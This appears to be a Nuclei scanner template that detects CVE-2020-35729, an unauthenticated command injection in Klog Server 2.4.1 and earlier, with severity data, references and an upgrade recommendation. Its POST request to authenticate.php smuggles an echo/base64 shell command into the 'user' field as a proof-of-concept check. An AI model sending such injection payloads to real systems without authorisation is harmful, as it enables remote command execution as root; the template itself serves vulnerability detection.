id: CVE-2020-35729
info:
  name: Klog Server <=2.41 - Unauthenticated Command Injection
  author: dwisiswant0
  severity: critical
  description: Klog Server version 2.4.1 and earlier has an unauthenticated command
    injection vulnerability that allows arbitrary command execution as the Apache
    user with root privileges due to insufficient input validation in the `user` HTTP
    POST parameter in the `authenticate.php` file and sudo configuration.
  reference:
  - https://docs.unsafe-inline.com/0day/klog-server-unauthentication-command-injection
  - https://nvd.nist.gov/vuln/detail/CVE-2020-35729
  - https://github.com/mustgundogdu/Research/blob/main/KLOG_SERVER/Exploit_Code
  - https://github.com/mustgundogdu/Research/blob/main/KLOG_SERVER/README.md
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2020-35729
    cwe-id: CWE-78
  tags: cve,cve2020,klog,rce
  metadata:
    impact: The unauthenticated command injection vulnerability in Klog Server <=2.41,
      allowing for arbitrary command execution as the apache user and privileged command
      execution as root, has significant impact on the security of systems running
      the affected software.
    recommendation: It is recommended that users of Klog Server update to version
      2.4.2 or later to address the unauthenticated command injection vulnerability
      (CVE-2020-35729) discovered in version 2.4.1 and prior.
requests:
- method: POST
  path:
  - '{{BaseURL}}/actions/authenticate.php'
  body: user=pdnuclei%20%26%20echo%20%cG9jLXRlc3Rpbmc%3D%22%20%7C%20base64%20-d%20%26%20echo%22&pswd=pdnuclei
  matchers:
  - type: word
    words:
    - poc-testing
